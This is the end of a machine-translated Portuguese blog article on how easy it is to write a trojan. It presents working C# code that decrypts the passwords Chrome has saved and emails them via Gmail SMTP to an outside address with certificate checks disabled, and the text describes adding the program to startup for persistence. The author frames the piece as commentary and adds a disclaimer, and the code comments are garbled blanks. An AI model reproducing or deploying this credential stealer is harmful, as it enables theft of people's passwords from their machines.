                                   <span class="hljs-comment">//   -  ,  .</span>
            string description; <span class="hljs-comment">//       ,     .</span>
                                <span class="hljs-comment">//    </span>
            string ConnectionString = <span class="hljs-string">"data source="</span> + db_way + <span class="hljs-string">";New=True;UseUTF16Encoding=True"</span>;<font></font>
            DataTable DB = <span class="hljs-keyword">new</span> DataTable();<font></font>
            string sql = string.Format(<span class="hljs-string">"SELECT * FROM {0} {1} {2}"</span>, db_field, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>);<font></font>
<font></font>
            using (SQLiteConnection connect = <span class="hljs-keyword">new</span> SQLiteConnection(ConnectionString))<font></font>
            {<font></font>
                SQLiteCommand command = <span class="hljs-keyword">new</span> SQLiteCommand(sql, connect);<font></font>
                SQLiteDataAdapter adapter = <span class="hljs-keyword">new</span> SQLiteDataAdapter(command);<font></font>
                adapter.Fill(DB);<font></font>
                <span class="hljs-keyword">int</span> rows = DB.Rows.Count;<font></font>
<font></font>
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; rows; i++)<font></font>
                {<font></font>
                    Writer.Write(i + <span class="hljs-number">1</span> + <span class="hljs-string">") "</span>); <span class="hljs-comment">//        "--". </span>
                    Writer.WriteLine(DB.Rows[i][<span class="hljs-number">1</span>] + <span class="hljs-string">"&lt;br&gt;"</span>); <span class="hljs-comment">//   </span>
                    Writer.WriteLine(DB.Rows[i][<span class="hljs-number">3</span>] + <span class="hljs-string">"&lt;br&gt;"</span>); <span class="hljs-comment">// </span>
                                                              <span class="hljs-comment">//    </span>
                    <span class="hljs-keyword">byte</span>[] byteArray = (<span class="hljs-keyword">byte</span>[])DB.Rows[i][<span class="hljs-number">5</span>];
                    <span class="hljs-keyword">byte</span>[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);<font></font>
                    string password = <span class="hljs-keyword">new</span> UTF8Encoding(<span class="hljs-keyword">true</span>).GetString(decrypted);<font></font>
                    Writer.WriteLine(password + <span class="hljs-string">"&lt;br&gt;&lt;br&gt;"</span>);<font></font>
                }<font></font>
<font></font>
            }<font></font>
<font></font>
            Writer.Close();<font></font>
        }<font></font>
        <span class="hljs-keyword">catch</span><font></font>
        {   }<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Send</span><span class="hljs-params">()</span>
    </span>{<font></font>
        MailAddress from = <span class="hljs-keyword">new</span> MailAddress(<span class="hljs-string">"l**************d@gmail.com"</span>, <span class="hljs-string">"Passwords"</span>);<font></font>
        MailAddress to = <span class="hljs-keyword">new</span> MailAddress(<span class="hljs-string">"a***********v@yandex.ru"</span>);<font></font>
        MailMessage m = <span class="hljs-keyword">new</span> MailMessage(from, to);<font></font>
        m.Subject = (DateTime.Now).ToString();<font></font>
        m.Body = <span class="hljs-string">""</span>;<font></font>
        m.IsBodyHtml = <span class="hljs-keyword">true</span>;<font></font>
        SmtpClient smtp = <span class="hljs-keyword">new</span> SmtpClient(<span class="hljs-string">"smtp.gmail.com"</span>, <span class="hljs-number">587</span>); ;<font></font>
        smtp.Credentials = <span class="hljs-keyword">new</span> NetworkCredential(<span class="hljs-string">"l*****************d@gmail.com"</span>, <span class="hljs-string">"q********l"</span>);<font></font>
        smtp.EnableSsl = <span class="hljs-keyword">true</span>;<font></font>
        ServicePointManager.ServerCertificateValidationCallback = delegate { <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>; };<font></font>
        m.Attachments.Add(<span class="hljs-keyword">new</span> Attachment(filename));
        <span class="hljs-keyword">try</span><font></font>
        {<font></font>
            smtp.Send(m);<font></font>
        }<font></font>
        <span class="hljs-keyword">catch</span> { }<font></font>
    }<font></font>
<font></font>
<font></font>
}</code></pre><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A maior parte do c√≥digo para descriptografar a senha √© obtida no </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">artigo</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> correspondente </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;">sobre o armazenamento de senhas no Chrome</font></a><font style="vertical-align: inherit;"> , que, de fato, √© f√°cil de pesquisar no Google e de dom√≠nio p√∫blico. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tudo o que restaria para transformar este produto de software em um cavalo de Troia √© adicionar a capacidade de "infectar" um computador com ele sem o conhecimento do usu√°rio, adicionar algumas condi√ß√µes de disparo e ensinar a enviar informa√ß√µes roubadas para algum servidor remoto.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Por conseguinte, em geral, cada uma das etapas √© bem rastreada. Na fun√ß√£o Registr, o programa se copia para a pasta de servi√ßo e entra em execu√ß√£o autom√°tica quando o sistema operacional √© inicializado; no bloco Gerar, gera um arquivo com senhas e logins, tudo √© um pouco confuso, mas a maior parte do c√≥digo usado aqui √© copiado de fontes abertas. O c√≥digo est√° comentado no local, aqui n√£o vejo motivo para repetir. E, finalmente, a fun√ß√£o Enviar envia o arquivo de senha para o correio especificado. O c√≥digo tamb√©m n√£o requer conhecimento profundo de soquetes e da pilha TCP / IP - no .NET tudo √© muito bem agrupado em uma classe de alto n√≠vel para trabalhar com correio. Se necess√°rio, voc√™ pode transferir dados para qualquer um dos protocolos, incluindo solicita√ß√µes POST e servidor FTP, mas isso n√£o precisaria aumentar o servidor - voc√™ pode usar o correio.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como resultado, ap√≥s meia hora de trabalho com o c√≥digo, obtivemos um cavalo de Troia de pleno direito, o qual, √© claro, √© capturado por antiv√≠rus, mas se voc√™ n√£o levar isso em conta, ele funcionar√° perfeitamente corretamente. E ao mesmo tempo, escrever um programa desse tipo levou muitas centenas de linhas de c√≥digo. Agora levou algumas dezenas de minutos.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Isso √© bom ou ruim? A quest√£o √© muito aberta, porque, por um lado, uma diminui√ß√£o no n√≠vel de ingresso na profiss√£o aumenta o afluxo de pessoal, recentemente ficou mais f√°cil escrever um programa de trabalho, respectivamente, houve mais programas e, em uma economia de mercado, isso √© certamente bom, porque a concorr√™ncia melhora a qualidade. Por outro lado, um baixo limiar de entrada significa um grande n√∫mero de funcion√°rios de baixa e m√©dia qualifica√ß√£o, por causa dos quais a qualidade dos produtos de software permanece inferior √† desejada, mesmo levando em conta todas as ferramentas que facilitam o trabalho do desenvolvedor - linguagens de programa√ß√£o modernas de alto n√≠vel, ambientes de desenvolvimento integrados, depuradores, etc. .</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bem, √© claro - como existem mais produtos de software, h√° mais v√≠rus. </font><font style="vertical-align: inherit;">Obviamente, um usu√°rio limpo e atencioso geralmente sabe como evit√°-los - ele n√£o segue os links das cartas e n√£o insere drives flash n√£o verificados. </font><font style="vertical-align: inherit;">Mas o fato permanece - agora, quando todo estudante do ensino m√©dio sabe como escrever um v√≠rus b√°sico - os antiv√≠rus se tornaram mais populares do que algumas d√©cadas atr√°s. </font></font><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O autor n√£o recomenda a cria√ß√£o de software malicioso e lembra que o acesso ilegal a informa√ß√µes privadas √© processado.</font></font></i></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt493928/index.html">Revis√£o e teste Huawei Dorado 5000V6</a></li>
<li><a href="../pt493932/index.html">Vis√£o geral das pesquisas do Google. Por que n√£o √© adequado para pesquisas s√©rias</a></li>
<li><a href="../pt493934/index.html">Quem, como e no que explorou os oceanos do mundo - analisamos as bases da NOAA</a></li>
<li><a href="../pt493938/index.html">Como cortar custos na AWS</a></li>
<li><a href="../pt493940/index.html">Protocolo de tratamento natural de coronav√≠rus 2019-nCoV</a></li>
<li><a href="../pt493944/index.html">Continuamos analisando vulnerabilidades de comutadores industriais: executamos c√≥digo arbitr√°rio sem senha</a></li>
<li><a href="../pt493948/index.html">Como eu fiz um respirador KN95 em casa a partir de materiais improvisados. instru√ß√µes detalhadas</a></li>
<li><a href="../pt493950/index.html">Calculadora de rede neural para adicionar e subtrair n√∫meros n√£o muito grandes</a></li>
<li><a href="../pt493952/index.html">Como avaliar a intelig√™ncia? Abordagem do Google</a></li>
<li><a href="../pt493954/index.html">PostgreSQL Adicionar restri√ß√µes n√£o nulas a tabelas grandes</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>